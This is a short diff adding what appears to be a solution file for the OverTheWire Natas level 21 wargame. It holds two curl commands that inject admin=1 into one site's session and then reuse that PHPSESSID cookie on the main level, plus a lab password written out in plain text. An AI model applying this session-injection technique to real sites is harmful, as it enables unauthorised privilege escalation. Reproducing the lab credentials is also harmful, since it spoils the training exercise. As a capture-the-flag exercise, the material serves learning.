@@ -1,0 +1,3 @@
+curl -v http://natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ@natas21-experimenter.natas.labs.overthewire.org/?submit&admin=1 
+curl --cookie PHPSESSID=c4sningdpk9l9b1o5no9o5cr91 http://natas21:natas21.natas.labs.overthewire.org/index.php
+IFekPyrQXftziDEsUr3x21sYuahypdgJ
